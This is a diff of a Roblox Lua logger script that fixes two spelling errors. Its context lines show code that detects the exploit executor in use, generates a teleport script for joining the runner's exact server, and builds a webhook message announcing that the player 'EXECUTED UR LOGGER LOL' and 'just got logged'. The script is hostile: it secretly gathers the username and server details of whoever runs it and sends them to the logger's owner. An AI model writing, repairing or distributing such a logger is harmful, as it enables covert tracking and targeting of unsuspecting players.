@@ -1,7 +1,7 @@
 local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
 print(helo) --line above generates a script that allows u to join the logged user
 
---checks exacutor
+--checks executor
 local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
@@ -15,7 +15,7 @@ local data = {
             ["username"] = "Salmon-L0G", --webhook name thing idk
             ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
     
-    ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** EXACUTED UR LOGGER LOL", --normal message
+    ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** EXECUTED UR LOGGER LOL", --normal message
     ["embeds"] = {
        {
            ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just got logged!!!**",
